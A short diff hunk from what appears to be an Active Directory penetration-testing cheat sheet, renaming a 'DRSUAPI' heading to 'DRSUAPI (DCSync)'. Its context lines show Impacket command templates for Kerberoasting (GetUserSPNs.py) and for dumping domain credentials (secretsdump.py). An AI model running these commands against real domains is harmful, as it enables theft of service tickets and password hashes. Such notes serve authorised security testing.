@@ -80,7 +80,7 @@ Kerberoastin
 ```
 GetUserSPNs.py DC-IP\user:password
 ```
-DRSUAPI
+DRSUAPI (DCSync)
 
 ```
 secretsdump.py domain.local/USER:PASSWORD@IP
